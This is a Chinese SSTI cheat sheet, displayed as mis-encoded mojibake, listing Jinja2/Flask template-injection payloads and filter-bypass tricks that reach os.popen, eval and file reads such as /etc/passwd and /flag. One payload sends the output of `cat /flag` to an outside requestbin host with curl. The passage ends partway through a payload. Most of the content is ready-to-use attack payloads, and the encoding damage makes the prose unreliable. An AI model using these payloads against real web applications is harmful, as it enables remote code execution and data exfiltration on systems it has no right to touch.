å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\\self\\fd/3&#x27;).read()request.args.x1 getä¼ å‚request.values.x1 æ‰€æœ‰å‚æ•°request.cookies cookieså‚æ•°request.headers è¯·æ±‚å¤´å‚æ•°request.form.x1 postä¼ å‚ (Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)request.data postä¼ å‚ (Content-Type:a/b)request.json postä¼ json (Content-Type: application/json)config å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;cycler &#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;joiner &#123;&#123;joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;namespace &#123;&#123;namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125; å¸¸ç”¨è¿‡æ»¤å™¨ï¼š 1234567891011121314151617181920212223242526int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;ï¼›list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#x27;xiaotuo&#x27;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯countã€‚ è·å–åŸºæœ¬ç±»ï¼š 12345&#x27;&#x27;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] #é’ˆå¯¹jinjia2/flaskä¸º[9]é€‚ç”¨ è·å–åŸºæœ¬ç±»åï¼Œç»§ç»­å‘ä¸‹è·å–åŸºæœ¬ç±»(object)çš„å­ç±»ï¼š 1object.__subclasses__() æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦wrapperçš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦wrapperçš„ï¼‰ï¼š 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[99].__init__&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt; æŸ¥çœ‹å…¶å¼•ç”¨__builtins__ï¼š builtinså³æ˜¯å¼•ç”¨ï¼ŒPythonç¨‹åºä¸€æ—¦å¯åŠ¨ï¼Œå®ƒå°±ä¼šåœ¨ç¨‹åºå‘˜æ‰€å†™çš„ä»£ç æ²¡æœ‰è¿è¡Œä¹‹å‰å°±å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­äº†,è€Œå¯¹äºbuiltinså´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨å¼•ç”¨çš„æ¨¡å— 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;] è¿™é‡Œä¼šè¿”å›dictç±»å‹ï¼Œå¯»æ‰¾keysä¸­å¯ç”¨å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼Œä½¿ç”¨keysä¸­çš„fileä»¥å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½ï¼š 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read() æ–¹æ³•äºŒå­˜åœ¨çš„å­æ¨¡å—å¯ä»¥é€šè¿‡.index()æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨çš„è¯è¿”å›ç´¢å¼•ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼š 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__().index(file)40[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() #å°†read() ä¿®æ”¹ä¸º write() å³ä¸ºå†™æ–‡ä»¶ å‘½ä»¤æ‰§è¡Œ åˆ©ç”¨eval è¿›è¡Œå‘½ä»¤æ‰§è¡Œ1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡ŒæŸ¥çœ‹warnings.catch_warningsæ–¹æ³•çš„ä½ç½®ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 59 æŸ¥çœ‹linecatchçš„ä½ç½®ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#x27;linecache&#x27;) 25 æŸ¥æ‰¾osæ¨¡å—çš„ä½ç½®ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.keys().index(&#x27;os&#x27;) 12 æŸ¥æ‰¾systemæ–¹æ³•çš„ä½ç½®ï¼ˆåœ¨è¿™é‡Œä½¿ç”¨os.open().read()å¯ä»¥å®ç°ä¸€æ ·çš„æ•ˆæœ,æ­¥éª¤ä¸€æ ·,ä¸å†å¤è¿°ï¼‰ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.keys().index(&#x27;system&#x27;) 144 è°ƒç”¨systemæ–¹æ³•ï¼š 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;) root ç›´æ¥æœç´¢ï¼š 1&gt;&gt;&gt; [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == &#x27;catch_warnings&#x27;][0]()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read() åˆ©ç”¨commands è¿›è¡Œå‘½ä»¤æ‰§è¡Œ12345&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read() åˆ©ç”¨ä»»æ„å­—ç¬¦ä¸²æˆ–ç‰¹æ®Šå˜é‡123sss.__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()request.application.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() ç»•è¿‡ ä¸­æ‹¬å· [] pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚ åœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤ï¼Œä½†å´èƒ½è¿”å›å…¶å€¼ï¼Œå–ä»£ä¸­æ‹¬å·ï¼Œæ¥å®ç°ç»•è¿‡ã€‚ 12&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)(&quot;cat /flag&quot;,shell=True,stdout=-1).communicate().__getitem__(0) unicodeå­—ç¬¦ï¼šï¼»ï¼½ï¼Œï¹‡ï¹ˆ å¼•å· â€˜â€™ request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥ï¼Œè¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚ 1&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd unicodeå­—ç¬¦ï¼šï¼‚ï¼‚ï¼Œï¼‡ï¼‡ å•ä¸‹åˆ’çº¿ _ è¿‡æ»¤äº†_å¯ä»¥ç”¨dir(0)[0][0]æˆ–è€…request[&#39;args&#39;]æˆ–è€… request[&#39;values&#39;]ç»•è¿‡ã€‚ åŒä¸‹åˆ’çº¿ __ åŒæ ·åˆ©ç”¨request.argså±æ€§ã€‚ 1&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ æˆ–è€…request.valueså±æ€§ã€‚ 1&#123;&#123;()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)&#125;&#125;&amp;x=__class__&amp;y=__base__&amp;z=__getitem__&amp;a=__subclasses__&amp;b=__init__&amp;c=__globals__&amp;d=__builtins__&amp;e=__import__&amp;f=os&amp;g=__dict__&amp;h=system&amp;i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag` ç‚¹ . &#39;&#39;.__class__å¯ä»¥å†™æˆ getattr(&#39;&#39;,&#39;__class__&#39;)æˆ–è€… &#39;&#39;|attr(&#39;__class__&#39;)ã€‚ &#39;&#39;.evalå¯ä»¥å†™æˆ &#39;&#39;|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)ã€‚ &#39;&#39;.__class__å¯ä»¥å†™æˆ&#39;&#39;[&#39;__class__&#39;] åŒèŠ±æ‹¬å· {%if [expression]==[value]%} yes {%endif%} {%print()%} unicodeå­—ç¬¦ï¼šï¸·ï¸·ï¸¸ï¸¸ åœ†æ‹¬å· unicodeå­—ç¬¦ï¼šâ½â¾ï¼Œâ‚â‚ å¯¹å‡½æ•°æ‰§è¡Œæ–¹å¼é‡è½½ï¼Œå¦‚ request.__class__.__getitem__=__builtins__.exec;ï¼Œæ‰§è¡Œrequest[payload] æ—¶ç›¸å½“äº exec(payload)ã€‚ lambdaè¡¨è¾¾å¼ã€‚ å¤–éƒ¨å‚æ•°åˆ©ç”¨ï¼ˆçˆ†ç ´ä¸‹æ ‡ï¼‰ request.argsæˆ–request.valuesã€‚ åˆ—ç›®å½• 1&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)|attr(request.args.init)|attr(request.args.g)|attr(request.args.item)(request.args.mod)|attr(request.args.func)(request.args.cmd)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read è¯»æ–‡ä»¶ 12&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125; &amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=/etc/passwd&amp;re=read æ•°å­— unicodeå­—ç¬¦ï¼šğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ï¼ŒğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡ï¼Œï¼ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™ å¯¹è±¡å±‚é¢ set {}=None å…¶ä»–å¼•ç”¨ï¼š &#123;&#123;% set config=None %&#125;&#125; =&gt; &#123;&#123;url_for.__globals__.current_app.config&#125;&#125; &#123;&#123;% set __builtins__=None %&#125;&#125; =&gt; &#123;&#123;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__&#125;&#125; del é‡è½½ï¼š reload(__builtins__) å…¶ä»– è·å¾—å¯¹åº”å‡½æ•°çš„ä¸Šä¸‹æ–‡å¸¸é‡ï¼šfunc.__code__.co_consts å…³é”®å­— base64ç¼–ç  __getattribute__ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ã€‚ ä¾‹å¦‚è¢«è¿‡æ»¤æ‰__class__å…³é”®è¯ï¼š 1&#123;&#123;[].__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125; å­—ç¬¦ä¸²æ‹¼æ¥ 1234567yyy.__init__.__globals__.__builtins__|attr(&#x27;__getit&#x27;&#x27;em__&#x27;)(&#x27;ev&#x27;&#x27;al&#x27;)(&#x27;__imp&#x27;&#x27;ort__(&quot;o&#x27;&#x27;s&quot;).po&#x27;&#x27;pen(&quot;ls /&quot;).re&#x27;&#x27;ad()&#x27;)[].__getattribute__(&#x27;__c&#x27;+&#x27;lass__&#x27;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&quot;op&quot;+&quot;en&quot;](&quot;/fl&quot;+&quot;ag&quot;).read()&#123;%print config|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;+&#x27;s&#x27;)|attr(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;ls&#x27;)|attr(&#x27;%c%c%c%c&#x27;|format(114,101,97,100))()%&#125;&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125; åè½¬ 1&#123;&#123;cycler[&#x27;__tini__&#x27;[::-1]][&#x27;__slabolg__&#x27;[::-1]].os.popen(&#x27;id&#x27;).read()&#125;&#125; lower() 1&#123;&#123;sss.__init__.__globals__.__builtins__.open(&quot;/FLAG&quot;.lower()).read()&#125;&#125; æ¸…ç©ºå…³é”®å­—list 12[å…³é”®å­—listå˜é‡å].clear()open(&quot;/flag&quot;).read() 16è¿›åˆ¶ 1.__class__ =&gt; [&quot;\\x5f\\x5fc\\x6cass\\x5f\\x5f&quot;] 8è¿›åˆ¶ 123456789.__class__ =&gt; [&quot;\\137\\137\\143\\154\\141\\163\\163\\137\\137&quot;].__base__ =&gt; [&quot;\\137\\137\\142\\141\\163\\145\\137\\137&quot;].__subclasses__ =&gt; [&quot;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137&quot;].__init__ =&gt; [&quot;\\137\\137\\151\\156\\151\\164\\137\\137&quot;].__globals__ =&gt; [&quot;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&quot;].__builtins__ =&gt; [&quot;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&quot;].__import__ =&gt; [&quot;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137&quot;].popen =&gt; [&quot;\\160\\157\\160\\145\\156&quot;].read =&gt; [&quot;\\162\\145\\141\\144&quot;] unicodeç¼–ç  1.__class__ =&gt; [&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;] unicodeå­—ç¬¦ / Non-ASCII Identifies ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğšğ›ğœğğğŸğ ğ¡ğ¢ğ£ğ¤ğ¥ğ¦ğ§ğ¨ğ©ğªğ«ğ¬ğ­ğ®ğ¯ğ°ğ±ğ²ğ³ ğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡ğ•’ğ•“ğ•”ğ••ğ•–ğ•—ğ•˜ğ•™ğ•šğ•›ğ•œğ•ğ•ğ•Ÿğ• ğ•¡ğ•¢ğ•£ğ•¤ğ•¥ğ•¦ğ•§ğ•¨ğ•©ğ•ªğ•« ï¼ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™ å‚è€ƒï¼šhttps://www.compart.com/en/unicode/U+0030 atträ¸è¿‡æ»¤å™¨ å¦‚æœæ²¡æœ‰è¿‡æ»¤globalsï¼Œä»globalsé‡ŒæŠŠevalå‡½æ•°æ‰¾å‡ºæ¥ï¼Œç„¶åæ„é€ ä»»æ„å­—ç¬¦ä¸²æ”¾è¿›å»RCEå³å¯ã€‚ å‚è€ƒï¼šhttps://www.gem-love.com/ctf/2598.html 123456789101112131415161718192021222324252627282930313233&#123;% set xhx = ((&#123; &#125;|select()|string()|list()).pop(24)|string())%&#125; # _&#123;% set spa = ((app.__doc__|list()).pop(102)|string())%&#125; #ç©ºæ ¼&#123;% set pt = ((app.__doc__|list()).pop(320)|string())%&#125; #ç‚¹&#123;% set yin = ((app.__doc__|list()).pop(337)|string())%&#125; #å•å¼•å·&#123;% set left = ((app.__doc__|list()).pop(264)|string())%&#125; #å·¦æ‹¬å·(&#123;% set right = ((app.__doc__|list()).pop(286)|string())%&#125; #å³æ‹¬å·)&#123;% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125; #æ–œçº¿/&#123;% set bu = dict(buil=aa,tins=dd)|join() %&#125; #builtins&#123;% set im = dict(imp=aa,ort=dd)|join() %&#125; #import&#123;% set sy = dict(po=aa,pen=dd)|join() %&#125; #popen&#123;% set os = dict(o=aa,s=dd)|join() %&#125; #os&#123;% set ca = dict(ca=aa,t=dd)|join() %&#125; #cat&#123;% set flg = dict(fl=aa,ag=dd)|join() %&#125; #flag&#123;% set ev = dict(ev=aa,al=dd)|join() %&#125; #eval&#123;% set red = dict(re=aa,ad=dd)|join()%&#125; #read&#123;% set bul = xhx*2~bu~xhx*2 %&#125; #__builtins__#æ‹¼æ¥èµ·æ¥ __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#123;% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; &#123;% for f,v in y1ng.__init__.__globals__.items() %&#125; #globals &#123;% if f == bul %&#125; &#123;% for a,b in v.items() %&#125; #builtins &#123;% if a == ev %&#125; #eval &#123;&#123;b(pld)&#125;&#125; #eval(pld) &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125;#payload#&#123;%%20set%20xhx%20=%20((&#123;%20&#125;|select()|string()|list()).pop(24)|string())%&#125;&#123;%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%&#125;&#123;%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%&#125;%20&#123;%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%&#125;&#123;%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%&#125;%20&#123;%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%&#125;%20&#123;%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;%20&#123;%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%&#125;&#123;%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%&#125;&#123;%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%&#125;&#123;%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%&#125;%20&#123;%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%&#125;&#123;%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%&#125;&#123;%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%&#125;%20&#123;%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%&#125;&#123;%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%&#125;&#123;%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%&#125;%20&#123;%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%&#125;&#123;%%20if%20f%20==%20bul%20%&#125;&#123;%%20for%20a,b%20in%20v.items()%20%&#125;&#123;%%20if%20a%20==%20ev%20%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; 12345678910111213141516171819202122&#123;%set a=dict(po=x,p=x)|join%&#125; #pop&#123;%set b=(()|select|string|list)|attr(a)(ğŸğŸ’)%&#125; #_&#123;%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%&#125; #__doc__&#123;%set d=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸ‘ğŸ•)%&#125; #å•å¼•å·&#123;%set e=(x|attr(c)|list)|attr(a)(ğŸğŸ”ğŸ’)%&#125; #å·¦æ‹¬å·(&#123;%set f=(x|attr(c)|list)|attr(a)(ğŸğŸ–ğŸ”)%&#125; #å³æ‹¬å·)&#123;%set g=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸğŸ)%&#125; #ç‚¹.&#123;%set h=(x|attr(c)|list)|attr(a)(ğŸğŸğŸ)%&#125; #ç©ºæ ¼&#123;%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%&#125; #__init__&#123;%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%&#125; #__globals__&#123;%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%&#125; #__getitem__&#123;%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%&#125; #__builtins__&#123;%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%&#125; #__import__&#123;%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(ğŸ‘ğŸ’ğŸ—)%&#125;&#123;%set o=dict(ev=x,al=x)|join()%&#125; #eval&#123;%set p=dict(o=x,s=x)|join()%&#125; #os&#123;%set q=dict(po=x,pen=x)|join()%&#125; #popen&#123;%set r=dict(re=x,ad=x)|join()%&#125; #read&#123;%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%&#125;&#123;%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%&#125;&#123;%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%&#125;&#123;&#123;u&#125;&#125; 1234567891011121314151617181920212223&#123;% set id=dict(ind=a,ex=a)|join%&#125;&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ls=dict(ls=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set nn=dict(n=a)|join%&#125;&#123;% set tt=dict(t=a)|join%&#125;&#123;% set ff=dict(f=a)|join%&#125;&#123;% set ooqq=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set shiba=five*five-three-three-one %&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set 